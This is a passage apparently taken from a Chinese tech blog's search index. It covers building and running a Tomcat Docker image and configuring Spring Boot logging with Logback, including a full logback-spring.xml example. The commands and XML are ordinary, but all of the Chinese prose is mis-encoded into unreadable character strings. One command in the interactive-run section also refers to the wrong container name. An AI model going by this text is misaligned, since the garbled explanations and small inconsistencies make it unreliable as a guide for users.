é€šè¿‡Dockerfileæ–‡ä»¶æ„å»ºæ–°çš„Dockeré•œåƒ# docker build -f dockerfile-tomcat -t peter/tomcat:7.0 . æŸ¥çœ‹æ–°æ„å»ºçš„ Docker é•œåƒ 123456789101112131415161718192021222324252627# æŸ¥çœ‹æ–°çš„Dockeré•œåƒ# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/tomcat 7.0 0e9595636ec9 15 minutes ago 796MBcentos latest 1e1148e4cc2c 6 weeks ago 202MB# æŸ¥çœ‹æ–°Dockeré•œåƒçš„åˆ›å»ºå†å²# docker history peter/tomcat:7.0IMAGE CREATED CREATED BY SIZE COMMENT0e9595636ec9 16 minutes ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "/usrâ€¦ 0Bb479edef4230 16 minutes ago /bin/sh -c #(nop) EXPOSE 8080 0Ba20730382df2 16 minutes ago /bin/sh -c #(nop) ENV PATH=/usr/local/sbin:â€¦ 0Ba5513cfc5ca9 16 minutes ago /bin/sh -c #(nop) ENV CATALINA_BASE=/usr/loâ€¦ 0Bb7be0dfd36f8 16 minutes ago /bin/sh -c #(nop) ENV CATALINA_HOME=/usr/loâ€¦ 0Be3a04651ecc3 16 minutes ago /bin/sh -c #(nop) ENV CLASSPATH=.:/usr/locaâ€¦ 0B7175d3dc0385 16 minutes ago /bin/sh -c #(nop) ENV JRE_HOME=/usr/local/jâ€¦ 0B216b322375a3 16 minutes ago /bin/sh -c #(nop) ENV JAVA_HOME=/usr/local/â€¦ 0B238817a0fa1a 16 minutes ago /bin/sh -c #(nop) WORKDIR /usr/local 0Bd94ddbd8b1c1 16 minutes ago /bin/sh -c #(nop) ENV work_path=/usr/local 0B47d23f3fc6e9 16 minutes ago /bin/sh -c yum -y install vim net-tools 79.5MB6b892d38a8ae 17 minutes ago /bin/sh -c yum -y update 104MBd1e7e6381726 18 minutes ago /bin/sh -c #(nop) ADD file:21b3872f37d37a6ddâ€¦ 397MB6efc79b6ed8b 18 minutes ago /bin/sh -c #(nop) ADD file:0581062dfa97146fdâ€¦ 13.7MBb3cd54bdd2ca 18 minutes ago /bin/sh -c #(nop) MAINTAINER peter&lt;peter@gmâ€¦ 0B1e1148e4cc2c 6 weeks ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) LABEL org.label-schema.scâ€¦ 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) ADD file:6f877549795f4798aâ€¦ 202MB ä»¥äº¤äº’å¼è¿è¡Œæ–°æ„å»ºçš„ Docker é•œåƒ 12345678910111213141516# ä»¥äº¤äº’å¼è¿è¡Œæ–°çš„Dockeré•œåƒï¼ŒæŒ‡å®šæ•°æ®å·ã€ç«¯å£æ˜ å°„ã€å®¹å™¨åç§°ï¼Œç»ˆç«¯ä¼šè¾“å‡ºTomcatå¯åŠ¨çš„æ—¥å¿—ä¿¡æ¯# docker run -it -v /container/apache-tomcat-7.0.77/logs:/usr/local/apache-tomcat-7.0.77/logs -p 8888:8080 --name="tomcat7.0-front" peter/tomcat:7.0# é€€å‡ºç»ˆç«¯ï¼ˆä¸åœæ­¢å®¹å™¨ï¼‰# ctrl + p + q# æŸ¥çœ‹å½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„Dockerå®¹å™¨# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc9544cf44667 peter/tomcat:7.0 "/bin/sh -c \'/usr/loâ€¦" 7 seconds ago Up 5 seconds 0.0.0.0:8888-&gt;8080/tcp tomcat7.0-front# é‡æ–°è¿æ¥åˆ°Dockerå®¹å™¨ï¼Œè¿æ¥ä¹‹åå¦‚æœæƒ³æ–­å¼€è¿æ¥ï¼Œåœ¨å®¹å™¨å†…çš„ç»ˆç«¯ç›´æ¥æ‰§è¡Œ"exit"å‘½ä»¤å³å¯ï¼Œè¿æ¥æ–­å¼€åå®¹å™¨ä¸ä¼šåœæ­¢è¿è¡Œ# docker exec -it tomcat7.0-front /bin/bash# å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç›´æ¥æ£€æµ‹å®¹å™¨å†…å®‰è£…çš„JDKç‰ˆæœ¬ï¼Œä»¥æ­¤åˆ¤æ–­JDKæ˜¯å¦å®‰è£…æˆåŠŸ# docker exec tomcat7.0-daemon java -version ä»¥åå°æ–¹å¼è¿è¡Œæ–°æ„å»ºçš„ Docker é•œåƒ 12345678910111213# ä»¥åå°æ–¹å¼è¿è¡Œæ–°çš„Dockeré•œåƒï¼ŒæŒ‡å®šæ•°æ®å·ã€ç«¯å£æ˜ å°„ã€å®¹å™¨åç§°# docker run -d -v /container/apache-tomcat-7.0.77/logs:/usr/local/apache-tomcat-7.0.77/logs -p 8888:8080 --name="tomcat7.0-daemon" peter/tomcat:7.0# æŸ¥çœ‹å½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„Dockerå®¹å™¨# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES3add0356f6a1 peter/tomcat:7.0 "/bin/sh -c \'/usr/loâ€¦" 5 seconds ago Up 3 seconds 0.0.0.0:8888-&gt;8080/tcp tomcat7.0-daemon# é‡æ–°è¿æ¥åˆ°Dockerå®¹å™¨ï¼Œè¿æ¥ä¹‹åå¦‚æœæƒ³æ–­å¼€è¿æ¥ï¼Œåœ¨å®¹å™¨å†…çš„ç»ˆç«¯ç›´æ¥æ‰§è¡Œ"exit"å‘½ä»¤å³å¯ï¼Œè¿æ¥æ–­å¼€åå®¹å™¨ä¸ä¼šåœæ­¢è¿è¡Œ# docker exec -it tomcat7.0-daemon /bin/bash# å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç›´æ¥æ£€æµ‹å®¹å™¨å†…å®‰è£…çš„JDKç‰ˆæœ¬ï¼Œä»¥æ­¤åˆ¤æ–­JDKæ˜¯å¦å®‰è£…æˆåŠŸ# docker exec tomcat7.0-daemon java -version var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ– webæœåŠ¡å™¨"},{title:"SpringBoot æ•´åˆ Logback æ—¥å¿—æ¡†æ¶",url:"/posts/5233fd9d.html",text:'å‰è¨€ ç›®å‰æ¯”è¾ƒæµè¡Œçš„æ—¥å¿—æ¡†æ¶æœ‰ Log4jã€Logback ç­‰ï¼Œè¿™ä¸¤ä¸ªæ¡†æ¶çš„ä½œè€…æ˜¯åŒä¸€ä¸ªäººï¼ŒLogback æ—¨åœ¨ä½œä¸ºæµè¡Œçš„ Log4j é¡¹ç›®çš„åç»­ç‰ˆæœ¬ï¼Œä»è€Œæ¢å¤ Log4j ç¦»å¼€çš„ä½ç½®ã€‚å¦å¤–&nbsp;SLF4J (Simple Logging Facade for Java)&nbsp;åˆ™æ˜¯ä¸€ä¸ªæ—¥å¿—é—¨é¢æ¡†æ¶ï¼Œæä¾›äº†æ—¥å¿—ç³»ç»Ÿä¸­å¸¸ç”¨çš„æ¥å£ï¼ŒLogback å’Œ Log4j åˆ™å¯¹ SLF4J è¿›è¡Œäº†å®ç°ã€‚æœ¬æ–‡å°†è®²è¿°å¦‚ä½•åœ¨ Spring Boot ä¸­åº”ç”¨ SLF4J + Logback å®ç°æ—¥å¿—çš„è®°å½•ã€‚ å¼•å…¥ä¾èµ– Spring Boot é»˜è®¤å†…ç½®äº† Logback æ—¥å¿—æ¡†æ¶ï¼Œä¸€èˆ¬åªéœ€åœ¨ Maven ä¸­è¦å¼•å…¥ spring-boot-starter-logging ä¾èµ–ã€‚ 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;&lt;/dependency&gt; ä½†æ˜¯åœ¨å®é™…å¼€å‘ä¸­ä¸éœ€è¦ç›´æ¥æ·»åŠ  spring-boot-starter-logging ä¾èµ–ï¼Œå› ä¸º spring-boot-starter å…¶ä¸­å·²ç»åŒ…å«äº† spring-boot-starter-loggingï¼Œè¯¥ä¾èµ–çš„å†…å®¹å°±æ˜¯ Spring Boot é»˜è®¤æ”¯æŒçš„æ—¥å¿—æ¡†æ¶ SLF4J + Logbackã€‚è€Œ spring-boot-starter-web åˆåŒ…å«äº† spring-boot-starterï¼Œæ‰€ä»¥åªéœ€è¦å¼•å…¥ Spring Boot çš„ Web ç»„ä»¶å³å¯ã€‚ 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; ç”±äº Spring Cloud æ˜¯ä¾èµ– Spring Boot çš„ï¼Œå› æ­¤ä¸Šè¿° Maven é…ç½®åŒæ ·é€‚ç”¨äº Spring Cloud é¡¹ç›®ã€‚ é»˜è®¤é…ç½® é»˜è®¤æƒ…å†µä¸‹ Spring Boot ä¼šå°†æ—¥å¿—è¾“å‡ºåˆ°æ§åˆ¶å°ï¼Œä½†ä¸ä¼šå†™åˆ°æ—¥å¿—æ–‡ä»¶é‡Œã€‚å¦‚æœè¦å†™å…¥åˆ°é™¤æ§åˆ¶å°è¾“å‡ºä¹‹å¤–çš„æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œåˆ™éœ€åœ¨ application.properties ä¸­è®¾ç½® logging.file æˆ– logging.path å±æ€§ã€‚ 123456# äºŒè€…ä¸èƒ½åŒæ—¶ä½¿ç”¨ï¼Œè‹¥åŒæ—¶ä½¿ç”¨ï¼Œåˆ™åªæœ‰logging.fileç”Ÿæ•ˆlogging.file=æ–‡ä»¶ålogging.path=æ—¥å¿—æ–‡ä»¶è·¯å¾„logging.level.åŒ…å=æŒ‡å®šåŒ…ä¸‹çš„æ—¥å¿—çº§åˆ«logging.pattern.console=æ—¥å¿—æ‰“å°è§„åˆ™ logging.fileï¼šè®¾ç½®æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œå¦‚ï¼šlogging.file=blog.log logging.pathï¼šè®¾ç½®ç›®å½•ï¼Œä¼šåœ¨è¯¥ç›®å½•ä¸‹åˆ›å»º spring.log æ–‡ä»¶ï¼Œå¹¶å†™å…¥æ—¥å¿—å†…å®¹ï¼Œå¦‚ï¼šlogging.path=/tmp/log å¯ä»¥çœ‹åˆ°ä¸Šè¿°è¿™ç§æ–¹å¼é…ç½®æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯èƒ½å®ç°çš„åŠŸèƒ½ä¹Ÿéå¸¸æœ‰é™ï¼Œå¦‚æœæƒ³è¦æ›´å¤æ‚çš„éœ€æ±‚ï¼Œå°±éœ€è¦ä¸‹é¢çš„ logback-spring.xml å®šåˆ¶åŒ–é…ç½®äº†ã€‚ logback-spring.xml é…ç½®è¯¦è§£ Spring Boot å®˜æ–¹æ¨èä½¿ç”¨çš„ XML é…ç½®æ–‡ä»¶çš„åç§°ä¸ºï¼šlogback-spring.xmlï¼Œè€Œä¸æ˜¯ logback.xmlï¼Œè¿™æ˜¯å› ä¸ºå¸¦ -spring åç¼€çš„æ–‡ä»¶åå¯ä»¥ä½¿ç”¨ &lt;springProfile&gt; è¿™ä¸ªæ ‡ç­¾ï¼Œå³åœ¨ src/main/resources ä¸‹åˆ›å»º logback-spring.xml æ–‡ä»¶ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„æ–‡ä»¶åç§°ï¼Œæ¯”å¦‚ logback-config.xmlï¼Œæ­¤æ—¶åªéœ€è¦åœ¨ application.properties æ–‡ä»¶ä¸­ä½¿ç”¨ logging.config=classpath:logback-config.xml æŒ‡å®šå³å¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- æ—¥å¿—çº§åˆ«ä»ä½åˆ°é«˜åˆ†ä¸ºTRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATALï¼Œå¦‚æœè®¾ç½®ä¸ºWARNï¼Œåˆ™ä½äºWARNçš„ä¿¡æ¯éƒ½ä¸ä¼šè¾“å‡º --&gt;&lt;!-- scan:å½“æ­¤å±æ€§è®¾ç½®ä¸ºtrueæ—¶ï¼Œé…ç½®æ–‡ä»¶å¦‚æœå‘ç”Ÿæ”¹å˜ï¼Œå°†ä¼šè¢«é‡æ–°åŠ è½½ï¼Œé»˜è®¤å€¼ä¸ºtrue --&gt;&lt;!-- scanPeriod:è®¾ç½®ç›‘æµ‹é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰ä¿®æ”¹çš„æ—¶é—´é—´éš”ï¼Œå¦‚æœæ²¡æœ‰ç»™å‡ºæ—¶é—´å•ä½ï¼Œé»˜è®¤å•ä½æ˜¯æ¯«ç§’ã€‚å½“scanä¸ºtrueæ—¶ï¼Œæ­¤å±æ€§ç”Ÿæ•ˆã€‚é»˜è®¤çš„æ—¶é—´é—´éš”ä¸º1åˆ†é’Ÿã€‚ --&gt;&lt;!-- debug:å½“æ­¤å±æ€§è®¾ç½®ä¸ºtrueæ—¶ï¼Œå°†æ‰“å°å‡ºlogbackå†…éƒ¨æ—¥å¿—ä¿¡æ¯ï¼Œå®æ—¶æŸ¥çœ‹logbackè¿è¡ŒçŠ¶æ€ã€‚é»˜è®¤å€¼ä¸ºfalseã€‚ --&gt;&lt;configuration scan="true" scanPeriod="60 seconds" debug="false"&gt; &lt;!-- æ—¥å¿—ä¸Šä¸‹æ–‡åç§°--&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;!-- æ—¥å¿—æ–‡ä»¶çš„ç›®å½•è·¯å¾„--&gt; &lt;property name="log.path" value="/tmp/log/pricing/eureka" /&gt; &lt;!-- å½©è‰²æ—¥å¿—ä¾èµ–çš„æ¸²æŸ“ç±»ä¸å½©è‰²æ—¥å¿—æ ¼å¼ --&gt; &lt;conversionRule conversionWord="clr" converterClass="org.springframework.boot.logging.logback.ColorConverter" /&gt; &lt;conversionRule conversionWord="wex" converterClass="org.springframework.boot.logging.logback.WhitespaceThrowableProxyConverter" /&gt; &lt;conversionRule conversionWord="wEx" converterClass="org.springframework.boot.logging.logback.ExtendedWhitespaceThrowableProxyConverter" /&gt; &lt;property name="CONSOLE_LOG_PATTERN" value="${CONSOLE_LOG_PATTERN:-%clr(%d{yyyy-MM-dd HH:mm:ss.SSS}){faint} %clr(${LOG_LEVEL_PATTERN:-%5p}) %clr(${PID:- }){magenta} %clr(---){faint} %clr([%15.15t]){faint} %clr(%-40.40logger{39}){cyan} %clr(:){faint} %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}"/&gt; &lt;!--è¾“å‡ºåˆ°æ§åˆ¶å°--&gt; &lt;appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;!--æ­¤æ—¥å¿—appenderæ˜¯ä¸ºå¼€å‘ä½¿ç”¨ï¼Œåªé…ç½®æœ€åº•çº§åˆ«ï¼Œæ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—çº§åˆ«æ˜¯å¤§äºæˆ–ç­‰äºæ­¤çº§åˆ«çš„æ—¥å¿—ä¿¡æ¯--&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;Pattern&gt;${CONSOLE_LOG_PATTERN}&lt;/Pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--è¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶--&gt; &lt;!-- æ—¶é—´æ»šåŠ¨è¾“å‡ºlevelä¸ºDEBUGæ—¥å¿— --&gt; &lt;appender name="DEBUG_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- æ­£åœ¨è®°å½•çš„æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„åŠæ–‡ä»¶å --&gt; &lt;file&gt;${log.path}/log_debug.log&lt;/file&gt; &lt;!--æ—¥å¿—æ–‡ä»¶è¾“å‡ºæ ¼å¼--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- æ—¥å¿—è®°å½•å™¨çš„æ»šåŠ¨ç­–ç•¥ï¼ŒæŒ‰æ—¥æœŸï¼ŒæŒ‰å¤§å°è®°å½• --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- æ—¥å¿—å½’æ¡£ --&gt; &lt;fileNamePattern&gt;${log.path}/debug/log-debug-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤©æ•°--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- æ­¤æ—¥å¿—æ–‡ä»¶åªè®°å½•DEBUGçº§åˆ«çš„ --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;debug&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- æ—¶é—´æ»šåŠ¨è¾“å‡ºlevelä¸ºINFOæ—¥å¿— --&gt; &lt;appender name="INFO_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- æ­£åœ¨è®°å½•çš„æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„åŠæ–‡ä»¶å --&gt; &lt;file&gt;${log.path}/log_info.log&lt;/file&gt; &lt;!--æ—¥å¿—æ–‡ä»¶è¾“å‡ºæ ¼å¼--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- æ—¥å¿—è®°å½•å™¨çš„æ»šåŠ¨ç­–ç•¥ï¼ŒæŒ‰æ—¥æœŸï¼ŒæŒ‰å¤§å°è®°å½• --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- æ¯å¤©æ—¥å¿—å½’æ¡£è·¯å¾„ä»¥åŠæ ¼å¼ --&gt; &lt;fileNamePattern&gt;${log.path}/info/log-info-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤©æ•°--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- æ­¤æ—¥å¿—æ–‡ä»¶åªè®°å½•INFOçº§åˆ«çš„ --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- æ—¶é—´æ»šåŠ¨è¾“å‡ºlevelä¸ºWARNæ—¥å¿— --&gt; &lt;appender name="WARN_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- æ­£åœ¨è®°å½•çš„æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„åŠæ–‡ä»¶å --&gt; &lt;file&gt;${log.path}/log_warn.log&lt;/file&gt; &lt;!--æ—¥å¿—æ–‡ä»¶è¾“å‡ºæ ¼å¼--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- æ—¥å¿—è®°å½•å™¨çš„æ»šåŠ¨ç­–ç•¥ï¼ŒæŒ‰æ—¥æœŸï¼ŒæŒ‰å¤§å°è®°å½• --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/warn/log-warn-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤©æ•°--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- æ­¤æ—¥å¿—æ–‡ä»¶åªè®°å½•WARNçº§åˆ«çš„ --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;warn&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- æ—¶é—´æ»šåŠ¨è¾“å‡ºlevelä¸ºERRORæ—¥å¿— --&gt; &lt;appender name="ERROR_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- æ­£åœ¨è®°å½•çš„æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„åŠæ–‡ä»¶å --&gt; &lt;file&gt;${log.path}/log_error.log&lt;/file&gt; &lt;!--æ—¥å¿—æ–‡ä»¶è¾“å‡ºæ ¼å¼--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- æ—¥å¿—è®°å½•å™¨çš„æ»šåŠ¨ç­–ç•¥ï¼ŒæŒ‰æ—¥æœŸï¼ŒæŒ‰å¤§å°è®°å½• --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/error/log-error-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤©æ•°--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- æ­¤æ—¥å¿—æ–‡ä»¶åªè®°å½•ERRORçº§åˆ«çš„ --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- &lt;logger&gt;ç”¨æ¥è®¾ç½®æŸä¸€ä¸ªåŒ…æˆ–è€…å…·ä½“çš„æŸä¸€ä¸ªç±»çš„æ—¥å¿—æ‰“å°çº§åˆ«ï¼Œä»¥åŠæŒ‡å®š&lt;appender&gt;ã€‚&lt;logger&gt;ä»…æœ‰ä¸€ä¸ªnameå±æ€§ï¼Œä¸€ä¸ªå¯é€‰çš„levelå’Œä¸€ä¸ªå¯é€‰çš„addtivityå±æ€§ã€‚ name:ç”¨æ¥æŒ‡å®šå—æ­¤loggerçº¦æŸçš„æŸä¸€ä¸ªåŒ…æˆ–è€…å…·ä½“çš„æŸä¸€ä¸ªç±»ã€‚ level:ç”¨æ¥è®¾ç½®æ‰“å°çº§åˆ«ï¼Œå¤§å°å†™æ— å…³ï¼šTRACE, DEBUG, INFO, WARN, ERROR, ALL å’Œ OFFï¼Œè¿˜æœ‰ä¸€ä¸ªç‰¹ä¿—å€¼INHERITEDæˆ–è€…åŒä¹‰è¯NULLï¼Œä»£è¡¨å¼ºåˆ¶æ‰§è¡Œä¸Šçº§çš„çº§åˆ«ã€‚å¦‚æœæœªè®¾ç½®æ­¤å±æ€§ï¼Œé‚£ä¹ˆå½“å‰loggerå°†ä¼šç»§æ‰¿ä¸Šçº§çš„çº§åˆ«ã€‚ addtivity:æ˜¯å¦å‘ä¸Šçº§loggerä¼ é€’æ‰“å°ä¿¡æ¯ã€‚é»˜è®¤æ˜¯trueã€‚ &lt;logger name="org.springframework.web" level="info"/&gt; &lt;logger name="org.springframework.scheduling.annotation.ScheduledAnnotationBeanPostProcessor" level="INFO"/&gt; --&gt; &lt;!-- ä½¿ç”¨mybatisçš„æ—¶å€™ï¼Œsqlè¯­å¥æ˜¯debugä¸‹æ‰ä¼šæ‰“å°ï¼Œè€Œè¿™é‡Œåªé…ç½®äº†infoï¼Œæ‰€ä»¥æƒ³è¦æŸ¥çœ‹sqlè¯­å¥çš„è¯ï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ“ä½œï¼š ç¬¬ä¸€ç§ï¼šæŠŠ&lt;root level="info"&gt;æ”¹æˆ&lt;root level="DEBUG"&gt;è¿™æ ·å°±ä¼šæ‰“å°sqlï¼Œä¸è¿‡è¿™æ ·æ—¥å¿—é‚£è¾¹ä¼šå‡ºç°å¾ˆå¤šå…¶ä»–æ¶ˆæ¯ ç¬¬äºŒç§ï¼šå°±æ˜¯application.propertiesä¸­å•ç‹¬ç»™daoä¸‹ç›®å½•é…ç½®debugæ¨¡å¼ï¼Œå…·ä½“é…ç½®å¦‚ä¸‹ï¼Œè¿™æ ·é…ç½®sqlè¯­å¥ä¼šæ‰“å°ï¼Œå…¶ä»–è¿˜æ˜¯æ­£å¸¸infoçº§åˆ«ï¼š logging.level.dao=debug logging.level.org.mybatis=debug --&gt; &lt;!-- rootèŠ‚ç‚¹æ˜¯å¿…é€‰èŠ‚ç‚¹ï¼Œç”¨æ¥æŒ‡å®šæœ€åŸºç¡€çš„æ—¥å¿—è¾“å‡ºçº§åˆ«ï¼Œåªæœ‰ä¸€ä¸ªlevelå±æ€§ level:ç”¨æ¥è®¾ç½®æ‰“å°çº§åˆ«ï¼Œå¤§å°å†™æ— å…³ï¼šTRACE, DEBUG, INFO, WARN, ERROR, ALL å’Œ OFFï¼Œ ä¸èƒ½è®¾ç½®ä¸ºINHERITEDæˆ–è€…åŒä¹‰è¯NULLï¼Œé»˜è®¤æ˜¯DEBUG å¯ä»¥åŒ…å«é›¶ä¸ªæˆ–å¤šä¸ªå…ƒç´ ï¼Œæ ‡è¯†è¿™ä¸ªappenderå°†ä¼šæ·»åŠ åˆ°è¿™ä¸ªlogger --&gt; &lt;root level="info"&gt; &lt;appender-ref ref="CONSOLE" /&gt; &lt;appender-ref ref="DEBUG_FILE" /&gt; &lt;appender-ref ref="INFO_FILE" /&gt; &lt;appender-ref ref="WARN_FILE" /&gt; &lt;appender-ref ref="ERROR_FILE" /&gt; &lt;/root&gt; &lt;!--ç”Ÿäº§ç¯å¢ƒ:è¾“å‡ºåˆ°æ–‡ä»¶--&gt; &lt;!-- &lt;springProfile name="pro"&gt; &lt;root level="info"&gt; &lt;appender-ref ref="CONSOLE" /&gt; &lt;appender-ref ref="DEBUG_FILE" /&gt; &lt;appender-ref ref="INFO_FILE" /&gt; &lt;appender-ref ref="ERROR_FILE" /&gt; &lt;appender-ref ref="WARN_FILE" /&gt; &lt;/root&gt; &lt;/springProfile&gt; --&gt; &lt;!--å¼€å‘ç¯å¢ƒ:æ‰“å°æ§åˆ¶å°--&gt; &lt;!-- &lt;springProfile name="dev"&gt; &lt;logger name="com.nmys.view" level="debug"/&gt; &lt;/springProfile&gt; --&gt;&lt;/configuration&gt; 123&lt;springProfile name="dev"&gt; &lt;logger name="com.nmys.view" level="debug"/&gt;&lt;/springProfile&gt; ä¸Šé¢è¿™æ®µé…ç½®å†…å®¹ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ YML 